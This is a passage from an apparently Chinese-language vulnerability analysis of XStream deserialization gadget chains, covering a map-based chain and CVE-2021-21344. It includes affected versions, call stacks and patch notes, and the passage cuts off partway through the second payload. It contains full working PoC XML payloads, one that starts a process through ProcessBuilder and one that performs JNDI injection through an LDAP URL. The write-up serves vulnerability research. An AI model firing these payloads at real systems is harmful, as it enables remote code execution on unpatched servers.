class="name">handler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>good<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tree-map</span>&gt;</span></span><br></pre></td></tr></table></figure><p>函数调用栈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">invoke:275, MethodUtil (sun.reflect.misc)</span><br><span class="line">invokeInternal:482, EventHandler (java.beans)</span><br><span class="line">access$000:279, EventHandler (java.beans)</span><br><span class="line">run:430, EventHandler$1 (java.beans)</span><br><span class="line">doPrivileged:-1, AccessController (java.security)</span><br><span class="line">invoke:428, EventHandler (java.beans)</span><br><span class="line">compareTo:-1, $Proxy0 (com.sun.proxy)</span><br><span class="line">compare:1290, TreeMap (java.util)</span><br><span class="line">put:538, TreeMap (java.util)</span><br><span class="line">putAll:281, AbstractMap (java.util)</span><br><span class="line">putAll:327, TreeMap (java.util)</span><br><span class="line">populateTreeMap:122, TreeMapConverter (com.thoughtworks.xstream.converters.collections)</span><br><span class="line">unmarshal:79, TreeMapConverter (com.thoughtworks.xstream.converters.collections)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:65, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:50, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">start:134, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:32, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:1156, XStream (com.thoughtworks.xstream)</span><br><span class="line">unmarshal:1140, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:1020, XStream (com.thoughtworks.xstream)</span><br><span class="line">main:18, Vul (POC.treeMap)</span><br></pre></td></tr></table></figure><h2 id="map"><a href="#map" class="headerlink" title="map"></a>map</h2><h3 id="影响范围-4"><a href="#影响范围-4" class="headerlink" title="影响范围"></a>影响范围</h3><p>XStream &lt;&#x3D; 1.4.13</p><h3 id="版本说明-4"><a href="#版本说明-4" class="headerlink" title="版本说明"></a>版本说明</h3><ul><li>1.3.x 会直接报错</li><li>1.4.14 以后存在 对 <code>ProcessBuilder</code>的黑名单，在 <code>com.thoughtworks.xstream.XStream#setupSecurity</code>里<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1e7cb1f79ec65924fb6ccfb3b646cac4.png"></li></ul><h3 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞本质：利用 <code>MapConverter#putCurrentEntryIntoMap</code> 函数为入口，一直调用到<code>ImageIO$ContainsFilter#filter</code> </p><figure class="highlight xml"><figcaption><span>title:"poc.xml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">flags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">flags</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.SequenceInputStream&#x27;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">e</span> <span class="attr">class</span>=<span class="string">&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">iterator</span> <span class="attr">class</span>=<span class="string">&#x27;javax.imageio.spi.FilterIterator&#x27;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.ArrayList$Itr&#x27;</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">cursor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cursor</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">lastRet</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">lastRet</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">expectedModCount</span>&gt;</span>1<span class="tag">&lt;/<span class="name">expectedModCount</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">java.lang.ProcessBuilder</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                                                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--                                                    &lt;string&gt;-a&lt;/string&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--                                                    &lt;string&gt;Calculator&lt;/string&gt;--&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;/<span class="name">java.lang.ProcessBuilder</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">iter</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">&#x27;javax.imageio.ImageIO$ContainsFilter&#x27;</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">method</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">method</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">next</span>/&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">iterator</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">type</span>&gt;</span>KEYS<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">e</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">in</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.ByteArrayInputStream&#x27;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">buf</span>&gt;</span><span class="tag">&lt;/<span class="name">buf</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">pos</span>&gt;</span>0<span class="tag">&lt;/<span class="name">pos</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">mark</span>&gt;</span>0<span class="tag">&lt;/<span class="name">mark</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">count</span>&gt;</span>0<span class="tag">&lt;/<span class="name">count</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">in</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>test<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一个 entry 大概是这样的形式，第一个是key，第二个是value。 poc 把 payload 放在 key 那里了。</p><figure class="highlight xml"><figcaption><span>title:"Demo"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>key<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>value<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure><p>source点：<code>MapConverter#putCurrentEntryIntoMap</code>函数，内部调用了 target.put(key, value)，target是最根部的map标签（HashMap类型），key是payload（NativeString类型），value是test字符串。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1181eab16f39102d05ebca7a2f2c17ba.png"></p><p>然后 HashMap#put(key, value) 最终是可以调到 key#hashCode 的，也就进入了 NativeString#hashCode，也就是 xml 的第二个标签，后续每个调用都有标签的对应，无非是把反射赋值改为xml属性赋值。</p><p>sink点：<code>ImageIO$ContainsFilter#filter</code> 可以实现反射调用函数，参数可控。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/75101bb192bb662eed365839be01ff9d.png"></p><p>函数调用栈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">start:1007, ProcessBuilder (java.lang)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">filter:613, ImageIO$ContainsFilter (javax.imageio)</span><br><span class="line">advance:821, FilterIterator (javax.imageio.spi)</span><br><span class="line">next:839, FilterIterator (javax.imageio.spi)</span><br><span class="line">nextElement:153, MultiUIDefaults$MultiUIDefaultsEnumerator (javax.swing)</span><br><span class="line">nextStream:110, SequenceInputStream (java.io)</span><br><span class="line">read:211, SequenceInputStream (java.io)</span><br><span class="line">readFrom:65, ByteArrayOutputStreamEx (com.sun.xml.internal.bind.v2.util)</span><br><span class="line">get:182, Base64Data (com.sun.xml.internal.bind.v2.runtime.unmarshaller)</span><br><span class="line">toString:286, Base64Data (com.sun.xml.internal.bind.v2.runtime.unmarshaller)</span><br><span class="line">getStringValue:122, NativeString (jdk.nashorn.internal.objects)</span><br><span class="line">hashCode:118, NativeString (jdk.nashorn.internal.objects)</span><br><span class="line">hash:338, HashMap (java.util)</span><br><span class="line">put:611, HashMap (java.util)</span><br><span class="line">putCurrentEntryIntoMap:107, MapConverter (com.thoughtworks.xstream.converters.collections)</span><br><span class="line">populateMap:98, MapConverter (com.thoughtworks.xstream.converters.collections)</span><br><span class="line">populateMap:92, MapConverter (com.thoughtworks.xstream.converters.collections)</span><br><span class="line">unmarshal:87, MapConverter (com.thoughtworks.xstream.converters.collections)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:72, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:50, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">start:134, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:32, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:1404, XStream (com.thoughtworks.xstream)</span><br><span class="line">unmarshal:1383, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:1277, XStream (com.thoughtworks.xstream)</span><br><span class="line">main:18, Vul (POC.map)</span><br></pre></td></tr></table></figure><h2 id="java-util-PriorityQueue"><a href="#java-util-PriorityQueue" class="headerlink" title="java.util.PriorityQueue"></a>java.util.PriorityQueue</h2><h3 id="CVE-2021-21344"><a href="#CVE-2021-21344" class="headerlink" title="CVE-2021-21344"></a>CVE-2021-21344</h3><h4 id="影响范围-5"><a href="#影响范围-5" class="headerlink" title="影响范围"></a>影响范围</h4><p>XStream &lt;&#x3D; 1.4.15</p><h4 id="版本说明-5"><a href="#版本说明-5" class="headerlink" title="版本说明"></a>版本说明</h4><ul><li>1.3.x 会直接报错</li><li>1.4.15 以后添加了黑名单<code>sun.awt.datatransfer.DataTransferer$IndexOrderComparator</code> ，导致链子断了。<br><a href="https://github.com/x-stream/xstream/compare/XSTREAM_1_4_15...XSTREAM_1_4_16#diff-25808589fab633152848e5b504af8646ee4fa4b9e97765bdf6a3598870869d04L651">https://github.com/x-stream/xstream/compare/XSTREAM_1_4_15...XSTREAM_1_4_16#diff-25808589fab633152848e5b504af8646ee4fa4b9e97765bdf6a3598870869d04L651</a><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/18b4a0d4e69daa5aaf1b82e71d0b0993.png"></li></ul><h4 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>漏洞本质：在xml转java对象时，<code>SerializableConverter#doUnmarshal</code> 会调用标签所对应的类的readObject方法，例如test&#x2F;DemoForUsage 里能够调用 Person 类的readObject。这几乎是万能source了，只要有其他组件就能利用。CVE-2021-21344 以<code>java.util.PriorityQueue</code>为入口，找到一条触发  <code>JdbcRowSetImpl#connect</code>的链子，进行 JNDI 注入。</p><p>PS：除了默认的序列化方法，在<code>SerializableConverter#doMarshal</code>中支持重写方法writeObject的调用，所以当类实现了Serializable并且重写了writeObject，则会调用重写的writeObject。</p><p>一般在重写的writeObject方法中还是会调用SerializableConverter.defaultWriteObject方法来进行属性的序列化。 </p><p>下面是poc，需要起一个恶意本地 LDAP 服务器，接收 lookup。</p><figure class="highlight xml"><figcaption><span>title:"poc.xml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--affected_version: XStream --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">indexMap</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">packet</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">bi</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">jaxbType</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">jaxbType</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">uriProperties</span>/&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">attributeProperties</span>/&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">inheritedAttWildcard</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">getter</span>&gt;</span></span><br><span class="line">                                                    <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                                                    <span class="tag">&lt;<span class="name">name</span>&gt;</span>getDatabaseMetaData<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                                                    <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;/<span class="name">getter</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;/<span class="name">inheritedAttWildcard</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">bi</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">tagName</span>/&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">context</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">marshallerPool</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;/<span class="name">marshallerPool</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">nameList</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                                                    <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>true<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;/<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                                                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;/<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">localNames</span>&gt;</span></span><br><span class="line">                                                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;/<span class="name">localNames</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;/<span class="name">nameList</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">jaxbObject</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">concurrency</span>&gt;</span>1008<span class="tag">&lt;/<span class="name">concurrency</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">escapeProcessing</span>&gt;</span>true<span class="tag">&lt;/<span class="name">escapeProcessing</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">fetchDir</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">fetchDir</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">fetchSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">fetchSize</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">isolation</span>&gt;</span>2<span class="tag">&lt;/<span class="name">isolation</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">maxFieldSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxFieldSize</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">maxRows</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxRows</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">queryTimeout</span>&gt;</span>0<span class="tag">&lt;/<span class="name">queryTimeout</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">readOnly</span>&gt;</span>true<span class="tag">&lt;/<span class="name">readOnly</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">rowSetType</span>&gt;</span>1004<span class="tag">&lt;/<span class="name">rowSetType</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">showDeleted</span>&gt;</span>false<span class="tag">&lt;/<span class="name">showDeleted</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">dataSource</span>&gt;</span>ldap://127.0.0.1:1389/Basic/Command/calc<span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">params</span>/&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">iMatchColumns</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                                                <span 